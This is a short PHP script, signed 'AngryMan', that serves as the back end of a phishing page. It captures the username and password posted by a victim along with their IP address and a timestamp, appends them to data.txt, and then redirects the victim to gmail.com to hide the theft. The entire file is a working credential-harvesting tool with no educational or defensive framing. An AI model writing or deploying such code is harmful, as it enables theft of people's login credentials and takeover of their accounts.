<?php
//AngryMan
$user=$_POST['user'];
$pass=$_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];


echo "Loading...!";


$info= "**********************\n" . $user . "\n" . $pass . "\n" . $ip . "\n" . date("l jS \of F Y") . "\n" . date("h:i:sa") . "\n**********************\n\n";


$fp = fopen('data.txt', 'a');//opens file in append mode  
fwrite($fp,$info);  

fclose($fp);  
  


?>

<meta http-equiv="Refresh" content="1; url=https://www.gmail.com/">